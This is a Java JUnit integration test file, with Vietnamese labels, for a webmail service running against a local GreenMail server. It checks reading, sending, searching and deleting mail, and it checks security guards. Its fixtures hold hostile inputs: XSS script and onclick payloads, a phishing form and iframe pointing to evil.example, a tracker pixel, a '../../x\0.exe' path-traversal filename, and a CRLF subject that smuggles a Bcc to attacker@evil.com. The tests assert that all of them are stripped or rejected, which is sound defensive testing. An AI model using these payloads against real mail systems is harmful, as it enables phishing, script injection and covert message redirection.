package com.mailapp.mail.service;

import com.icegreen.greenmail.configuration.GreenMailConfiguration;
import com.icegreen.greenmail.junit5.GreenMailExtension;
import com.icegreen.greenmail.util.ServerSetup;
import com.mailapp.dto.mail.MailDtos.*;
import com.mailapp.exception.AppException;
import com.mailapp.mail.DefaultMailConnectionFactory;
import com.mailapp.mail.AccessTokenProvider;
import com.mailapp.mail.config.MailConnectionProperties;
import com.mailapp.mail.folder.GmailFolderResolver;
import com.mailapp.model.*;
import com.mailapp.repository.GmailAccountRepository;
import com.mailapp.security.AesCipher;
import com.mailapp.service.AuditLogService;
import com.mailapp.service.SystemSettingService;
import jakarta.activation.DataHandler;
import jakarta.mail.Message;
import jakarta.mail.Session;
import jakarta.mail.internet.*;
import jakarta.mail.util.ByteArrayDataSource;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.RegisterExtension;
import org.springframework.http.HttpStatus;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.web.multipart.MultipartFile;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.Properties;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.*;
import static org.mockito.Mockito.*;

@DisplayName("Kiểm thử tích hợp MailService với GreenMail (M08/M10/M12/M16/M17)")
class MailServiceGreenMailIntegrationTest {

    @RegisterExtension
    static GreenMailExtension greenMail = new GreenMailExtension(new ServerSetup[]{
            new ServerSetup(0, "127.0.0.1", ServerSetup.PROTOCOL_IMAPS),
            new ServerSetup(0, "127.0.0.1", ServerSetup.PROTOCOL_SMTP)
    }).withConfiguration(GreenMailConfiguration.aConfig().withUser("alice@test.local", "alicePass123"));

    private AesCipher aesCipher;
    private GmailAccountRepository gmailAccountRepository;
    private SystemSettingService systemSettingService;
    private AuditLogService auditLogService;
    private MailServiceImpl mailService;

    private User userAlice;
    private User userBob;
    private GmailAccount aliceGmail;

    @BeforeEach
    void setUp() throws Exception {
        greenMail.purgeEmailFromAllMailboxes();

        aesCipher = new AesCipher("dCPN0qIeMrPFVyn/9c05Pq1O65Re+wsVplG7fEFU4dU=");
        MailConnectionProperties props = new MailConnectionProperties();
        props.setImapHost("127.0.0.1");
        props.setImapPort(greenMail.getImaps().getPort());
        props.setSmtpHost("127.0.0.1");
        props.setSmtpPort(greenMail.getSmtp().getPort());
        props.setRetryEnabled(false);

        DefaultMailConnectionFactory factory = new DefaultMailConnectionFactory(
                props, aesCipher, mock(AccessTokenProvider.class), null);

        gmailAccountRepository = mock(GmailAccountRepository.class);
        systemSettingService = mock(SystemSettingService.class);
        auditLogService = mock(AuditLogService.class);

        when(systemSettingService.isMaintenanceMode()).thenReturn(false);
        when(systemSettingService.isSendMailEnabled()).thenReturn(true);
        when(systemSettingService.getMaxAttachmentSizeMb()).thenReturn(25);

        userAlice = new User(1L, "alice", "alice@mailapp.local", Role.USER);
        userBob = new User(2L, "bob", "bob@mailapp.local", Role.USER);

        aliceGmail = new GmailAccount();
        aliceGmail.setId(10L);
        aliceGmail.setUser(userAlice);
        aliceGmail.setEmail("alice@test.local");
        aliceGmail.setDisplayName("Alice Test");
        aliceGmail.setAuthType(AuthType.APP_PASSWORD);
        aliceGmail.setAppPasswordEncrypted(aesCipher.encrypt("alicePass123"));
        aliceGmail.setStatus(AccountStatus.ACTIVE);

        when(gmailAccountRepository.findById(10L)).thenReturn(Optional.of(aliceGmail));

        mailService = new MailServiceImpl(
                gmailAccountRepository,
                factory,
                new GmailFolderResolver(),
                systemSettingService,
                auditLogService,
                new HtmlSanitizerService(),
                new MailHeaderAndRateGuard(30, 15)
        );
    }

    @Test
    @DisplayName("M08/M12: Thư multipart lồng, tiêu đề UTF-8 tiếng Việt, ảnh inline cid:, HTML độc hại XSS + tracker, filename ../../x.exe")
    void testReadComplexMaliciousMailAndDownloadAttachment() throws Exception {
        byte[] attachBytes = "Nội dung tệp báo cáo đồ án PTIT 2026!".getBytes(StandardCharsets.UTF_8);

        Session session = Session.getInstance(new Properties());
        MimeMessage msg = new MimeMessage(session);
        msg.setFrom(new InternetAddress("sender@ptit.edu.vn", "Phòng Đào Tạo", "UTF-8"));
        msg.setRecipient(Message.RecipientType.TO, new InternetAddress("alice@test.local"));
        msg.setSubject("Thông báo lịch bảo vệ đồ án tốt nghiệp tiếng Việt", "UTF-8");

        MimeMultipart mixed = new MimeMultipart("mixed");

        // Multipart/alternative lồng nhau
        MimeBodyPart altContainer = new MimeBodyPart();
        MimeMultipart alt = new MimeMultipart("alternative");

        MimeBodyPart plain = new MimeBodyPart();
        plain.setText("Nội dung văn bản thuần tiếng Việt.", "UTF-8");

        MimeBodyPart html = new MimeBodyPart();
        html.setContent("""
                <div>
                    <h1>Xin chào</h1>
                    <script>alert('XSS')</script>
                    <iframe src="https://evil.example/phish"></iframe>
                    <form action="https://evil.example/steal"><input type="password"/></form>
                    <p onclick="stealCookie()">Nội dung an toàn</p>
                    <img src="cid:logo123" alt="Inline Logo"/>
                    <img src="https://tracker.evil.example/open.gif" width="1" height="1"/>
                </div>
                """, "text/html; charset=UTF-8");
        alt.addBodyPart(plain);
        alt.addBodyPart(html);
        altContainer.setContent(alt);
        mixed.addBodyPart(altContainer);

        // Ảnh inline cid
        MimeBodyPart inlineImg = new MimeBodyPart();
        inlineImg.setDataHandler(new DataHandler(new ByteArrayDataSource(new byte[]{1, 2, 3, 4}, "image/png")));
        inlineImg.setHeader("Content-ID", "<logo123>");
        inlineImg.setDisposition(MimeBodyPart.INLINE);
        inlineImg.setFileName("logo.png");
        mixed.addBodyPart(inlineImg);

        // Tệp đính kèm với tên path traversal + ký tự điều khiển
        MimeBodyPart evilAttach = new MimeBodyPart();
        evilAttach.setDataHandler(new DataHandler(new ByteArrayDataSource(attachBytes, "text/plain")));
        evilAttach.setDisposition(MimeBodyPart.ATTACHMENT);
        evilAttach.setFileName("../../x\u0000.exe");
        mixed.addBodyPart(evilAttach);

        msg.setContent(mixed);
        msg.saveChanges();

        greenMail.getUserManager().getUser("alice@test.local").deliver(msg);

        // 1. Liệt kê thư mục & thư
        List<MailFolderDto> folders = mailService.listFolders(userAlice, 10L);
        assertTrue(folders.stream().anyMatch(f -> "INBOX".equals(f.type()) && f.total() == 1));

        MailListResponse list = mailService.listMails(userAlice, 10L, "INBOX", 0, 30, null, null, null, null, null);
        assertEquals(1, list.items().size());
        MailSummaryDto summary = list.items().get(0);
        assertEquals("Thông báo lịch bảo vệ đồ án tốt nghiệp tiếng Việt", summary.subject());
        assertFalse(summary.flags().seen());
        assertTrue(summary.hasAttachment());

        // 2. Đọc chi tiết với loadRemote=false (mặc định)
        MailDetailResponse detail = mailService.getMailDetail(userAlice, 10L, "INBOX", summary.uid(), false, list.uidValidity());
        assertTrue(detail.flags().seen(), "Đọc chi tiết phải tự động đánh dấu \\Seen");
        assertTrue(detail.hasBlockedRemoteImages(), "Phải phát hiện và chặn ảnh theo dõi từ xa");
        assertNotNull(detail.htmlBody());
        assertFalse(detail.htmlBody().contains("<script"), "Phải loại bỏ thẻ script");
        assertFalse(detail.htmlBody().contains("<iframe"), "Phải loại bỏ thẻ iframe");
        assertFalse(detail.htmlBody().contains("<form"), "Phải loại bỏ thẻ form");
        assertFalse(detail.htmlBody().contains("onclick"), "Phải loại bỏ sự kiện onclick");
        assertFalse(detail.htmlBody().contains("src=\"https://tracker.evil.example"), "Phải chặn ảnh tracker khi loadRemote=false");
        assertTrue(detail.htmlBody().contains("cid:logo123"), "Phải giữ lại ảnh inline cid:");

        // Kiểm tra làm sạch tên tệp đính kèm
        assertEquals(2, detail.attachments().size());
        MailAttachmentDto secondAttach = detail.attachments().get(1);
        assertEquals("x.exe", secondAttach.filename(), "Tên tệp ../../x\\0.exe phải được làm sạch thành x.exe");

        // 3. Đọc chi tiết với loadRemote=true
        MailDetailResponse detailRemote = mailService.getMailDetail(userAlice, 10L, "INBOX", summary.uid(), true, list.uidValidity());
        assertFalse(detailRemote.hasBlockedRemoteImages());
        assertTrue(detailRemote.htmlBody().contains("https://tracker.evil.example/open.gif"));

        // 4. Tải tệp đính kèm dạng stream và so SHA-256
        MailService.AttachmentDownloadHandle handle = mailService.prepareAttachmentDownload(
                userAlice, 10L, "INBOX", summary.uid(), 1, list.uidValidity());
        assertEquals("x.exe", handle.sanitizedFilename());
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        handle.streamer().streamTo(baos);
        assertArrayEquals(sha256(attachBytes), sha256(baos.toByteArray()), "SHA-256 tệp tải về phải khớp tuyệt đối");

        // 5. Kiểm tra uidValidity đổi -> 409 UID_VALIDITY_CHANGED
        AppException uidEx = assertThrows(AppException.class, () ->
                mailService.getMailDetail(userAlice, 10L, "INBOX", summary.uid(), false, list.uidValidity() + 999L));
        assertEquals(HttpStatus.CONFLICT, uidEx.getStatus());
        assertEquals("UID_VALIDITY_CHANGED", uidEx.getCode());
    }

    @Test
    @DisplayName("M10/M16/M17: Gửi thư kèm đính kèm, tìm kiếm, phân trang, cập nhật cờ, xóa vào Thùng rác rồi xóa vĩnh viễn")
    void testSendSearchPaginateFlagsAndDeleteLifecycle() throws Exception {
        // Gửi 3 thư tới chính alice@test.local (1 thư có đính kèm)
        for (int i = 1; i <= 3; i++) {
            SendMailRequest req = new SendMailRequest(
                    10L,
                    List.of("alice@test.local"),
                    null, null,
                    "Báo cáo tuần " + i,
                    "Nội dung báo cáo số " + i,
                    "<p>Nội dung <b>HTML</b> số " + i + "</p>",
                    null, null
            );
            List<MultipartFile> files = (i == 3)
                    ? List.of(new MockMultipartFile("attachments", "baocao.txt", "text/plain", "hello ptit".getBytes(StandardCharsets.UTF_8)))
                    : null;

            SendMailResponse sent = mailService.sendMail(userAlice, req, files, "127.0.0.1");
            assertEquals("SENT", sent.status());
            assertNotNull(sent.messageId());
        }
        verify(auditLogService, times(3)).log(eq(1L), eq("SEND_MAIL"), contains("a***@test.local"), eq("127.0.0.1"));

        // Phân trang (size=2, mới nhất trước)
        MailListResponse page0 = mailService.listMails(userAlice, 10L, "INBOX", 0, 2, null, null, null, null, null);
        assertEquals(3, page0.total());
        assertEquals(2, page0.items().size());
        assertTrue(page0.hasMore());
        assertEquals("Báo cáo tuần 3", page0.items().get(0).subject());

        MailListResponse page1 = mailService.listMails(userAlice, 10L, "INBOX", 1, 2, null, null, null, null, null);
        assertEquals(1, page1.items().size());
        assertFalse(page1.hasMore());

        // Tìm kiếm theo từ khóa
        MailListResponse searchRes = mailService.listMails(userAlice, 10L, "INBOX", 0, 10, "tuần 2", null, null, null, null);
        assertEquals(1, searchRes.items().size());
        long targetUid = searchRes.items().get(0).uid();

        // Cập nhật cờ (M17: seen=true, flagged=true)
        MailFlagsDto updatedFlags = mailService.updateFlags(userAlice, 10L, "INBOX", targetUid,
                new UpdateFlagsRequest(true, true), page0.uidValidity());
        assertTrue(updatedFlags.seen());
        assertTrue(updatedFlags.flagged());

        // Chặn xóa vĩnh viễn khi thư đang ở INBOX
        AppException permEx = assertThrows(AppException.class, () ->
                mailService.deleteMail(userAlice, 10L, "INBOX", targetUid, true, null, "127.0.0.1"));
        assertEquals(HttpStatus.BAD_REQUEST, permEx.getStatus());
        assertEquals("PERMANENT_DELETE_REQUIRES_TRASH", permEx.getCode());

        // Xóa mềm (chuyển vào Thùng rác)
        Map<String, Object> softDel = mailService.deleteMail(userAlice, 10L, "INBOX", targetUid, false, null, "127.0.0.1");
        assertEquals("DELETED", softDel.get("status"));
        assertEquals(false, softDel.get("permanent"));

        // Kiểm tra thư đã sang Thùng rác, rồi xóa vĩnh viễn trong Thùng rác
        MailListResponse trashList = mailService.listMails(userAlice, 10L, "TRASH", 0, 10, null, null, null, null, null);
        assertEquals(1, trashList.items().size());
        long trashUid = trashList.items().get(0).uid();

        Map<String, Object> hardDel = mailService.deleteMail(userAlice, 10L, "TRASH", trashUid, true, null, "127.0.0.1");
        assertEquals("DELETED", hardDel.get("status"));
        assertEquals(true, hardDel.get("permanent"));

        MailListResponse trashAfter = mailService.listMails(userAlice, 10L, "TRASH", 0, 10, null, null, null, null, null);
        assertEquals(0, trashAfter.items().size());
        verify(auditLogService, times(2)).log(eq(1L), eq("DELETE_MAIL"), anyString(), eq("127.0.0.1"));
    }

    @Test
    @DisplayName("Bảo mật: IDOR, NEEDS_REAUTH, CRLF Header Injection, vượt MAX_ATTACHMENT_SIZE_MB, tắt ALLOW_SEND_MAIL")
    void testSecurityGuards() {
        // 1. Chống IDOR: Bob không được đọc Gmail của Alice
        AppException idorEx = assertThrows(AppException.class, () ->
                mailService.listFolders(userBob, 10L));
        assertEquals(HttpStatus.FORBIDDEN, idorEx.getStatus());
        assertEquals("FORBIDDEN", idorEx.getCode());

        // 2. NEEDS_REAUTH -> 409 GMAIL_NEEDS_REAUTH
        aliceGmail.setStatus(AccountStatus.NEEDS_REAUTH);
        AppException reauthEx = assertThrows(AppException.class, () ->
                mailService.listFolders(userAlice, 10L));
        assertEquals(HttpStatus.CONFLICT, reauthEx.getStatus());
        assertEquals("GMAIL_NEEDS_REAUTH", reauthEx.getCode());
        aliceGmail.setStatus(AccountStatus.ACTIVE);

        // 3. Tiêm CRLF vào Subject
        SendMailRequest crlfReq = new SendMailRequest(
                10L, List.of("victim@test.local"), null, null,
                "Hello\r\nBcc: attacker@evil.com", "body", null, null, null);
        AppException crlfEx = assertThrows(AppException.class, () ->
                mailService.sendMail(userAlice, crlfReq, null, "127.0.0.1"));
        assertEquals(HttpStatus.BAD_REQUEST, crlfEx.getStatus());
        assertEquals("HEADER_INJECTION_DETECTED", crlfEx.getCode());

        // 4. Vượt MAX_ATTACHMENT_SIZE_MB (đặt giới hạn 1 MB, gửi 1.5 MB)
        when(systemSettingService.getMaxAttachmentSizeMb()).thenReturn(1);
        byte[] bigData = new byte[1536 * 1024];
        MockMultipartFile bigFile = new MockMultipartFile("attachments", "huge.bin", "application/octet-stream", bigData);
        SendMailRequest okReq = new SendMailRequest(
                10L, List.of("alice@test.local"), null, null, "Test", "Body", null, null, null);
        AppException sizeEx = assertThrows(AppException.class, () ->
                mailService.sendMail(userAlice, okReq, List.of(bigFile), "127.0.0.1"));
        assertEquals(HttpStatus.PAYLOAD_TOO_LARGE, sizeEx.getStatus());
        assertEquals("PAYLOAD_TOO_LARGE", sizeEx.getCode());
        when(systemSettingService.getMaxAttachmentSizeMb()).thenReturn(25);

        // 5. Gửi khi cờ ALLOW_SEND_MAIL=false
        when(systemSettingService.isSendMailEnabled()).thenReturn(false);
        AppException disabledEx = assertThrows(AppException.class, () ->
                mailService.sendMail(userAlice, okReq, null, "127.0.0.1"));
        assertEquals(HttpStatus.FORBIDDEN, disabledEx.getStatus());
        assertEquals("FEATURE_DISABLED", disabledEx.getCode());
    }

    @Test
    @DisplayName("Hành vi xóa đúng chuẩn Gmail ([Gmail]/Trash & [Gmail]/All Mail): xóa mặc định sang Trash, trong Trash chỉ xóa vĩnh viễn khi permanent=true")
    void testGmailLikeTrashStructureMoveAndPermanentDeleteGuard() throws Exception {
        // Tạo cấu trúc thư mục giống Gmail thật trên GreenMail
        MailConnectionProperties props = new MailConnectionProperties();
        props.setImapHost("127.0.0.1");
        props.setImapPort(greenMail.getImaps().getPort());
        props.setRetryEnabled(false);
        DefaultMailConnectionFactory factory = new DefaultMailConnectionFactory(
                props, aesCipher, mock(AccessTokenProvider.class), null);

        try (var imap = factory.openImap(aliceGmail)) {
            jakarta.mail.Folder gmailTrash = imap.getStore().getFolder("[Gmail]/Trash");
            if (!gmailTrash.exists()) gmailTrash.create(jakarta.mail.Folder.HOLDS_MESSAGES);
            jakarta.mail.Folder allMail = imap.getStore().getFolder("[Gmail]/All Mail");
            if (!allMail.exists()) allMail.create(jakarta.mail.Folder.HOLDS_MESSAGES);
        }

        // Gửi 1 thư vào INBOX
        Session session = Session.getInstance(new Properties());
        MimeMessage msg = new MimeMessage(session);
        msg.setFrom(new InternetAddress("sender@test.local"));
        msg.setRecipient(Message.RecipientType.TO, new InternetAddress("alice@test.local"));
        msg.setSubject("Gmail Trash Behavior Check", "UTF-8");
        msg.setText("Kiểm tra chuyển vào [Gmail]/Trash thay vì chỉ lưu trữ All Mail", "UTF-8");
        msg.saveChanges();
        greenMail.getUserManager().getUser("alice@test.local").deliver(msg);

        MailListResponse inboxBefore = mailService.listMails(userAlice, 10L, "INBOX", 0, 10, null, null, null, null, null);
        assertEquals(1, inboxBefore.items().size());
        long uid = inboxBefore.items().get(0).uid();

        // 1. Xóa mặc định (permanent=false) từ INBOX -> phải COPY sang [Gmail]/Trash rồi expunge khỏi INBOX
        Map<String, Object> moved = mailService.deleteMail(userAlice, 10L, "INBOX", uid, false, inboxBefore.uidValidity(), "127.0.0.1");
        assertEquals("DELETED", moved.get("status"));
        assertEquals(false, moved.get("permanent"));

        assertEquals(0, mailService.listMails(userAlice, 10L, "INBOX", 0, 10, null, null, null, null, null).items().size(),
                "Thư phải biến mất khỏi INBOX sau khi xóa mềm");
        assertEquals(0, mailService.listMails(userAlice, 10L, "[Gmail]/All Mail", 0, 10, null, null, null, null, null).items().size(),
                "Không được chỉ lưu trữ vào All Mail");

        MailListResponse trashList = mailService.listMails(userAlice, 10L, "[Gmail]/Trash", 0, 10, null, null, null, null, null);
        assertEquals(1, trashList.items().size(), "Thư phải xuất hiện trong [Gmail]/Trash");
        assertEquals("Gmail Trash Behavior Check", trashList.items().get(0).subject());
        long trashUid = trashList.items().get(0).uid();

        // 2. Thư đã ở Thùng rác mà gọi permanent=false -> PHẢI từ chối 400 và KHÔNG xóa vĩnh viễn!
        AppException needPerm = assertThrows(AppException.class, () ->
                mailService.deleteMail(userAlice, 10L, "[Gmail]/Trash", trashUid, false, trashList.uidValidity(), "127.0.0.1"));
        assertEquals(HttpStatus.BAD_REQUEST, needPerm.getStatus());
        assertEquals("PERMANENT_DELETE_REQUIRED_IN_TRASH", needPerm.getCode());
        assertEquals(1, mailService.listMails(userAlice, 10L, "[Gmail]/Trash", 0, 10, null, null, null, null, null).items().size(),
                "Thư trong Thùng rác KHÔNG được bị xóa khi permanent=false");

        // 3. Gọi permanent=true trong [Gmail]/Trash -> xóa vĩnh viễn thành công
        Map<String, Object> purged = mailService.deleteMail(userAlice, 10L, "[Gmail]/Trash", trashUid, true, trashList.uidValidity(), "127.0.0.1");
        assertEquals(true, purged.get("permanent"));
        assertEquals(0, mailService.listMails(userAlice, 10L, "[Gmail]/Trash", 0, 10, null, null, null, null, null).items().size(),
                "Thư phải bị xóa vĩnh viễn khỏi [Gmail]/Trash khi permanent=true");
    }

    private byte[] sha256(byte[] data) throws Exception {
        return MessageDigest.getInstance("SHA-256").digest(data);
    }
}

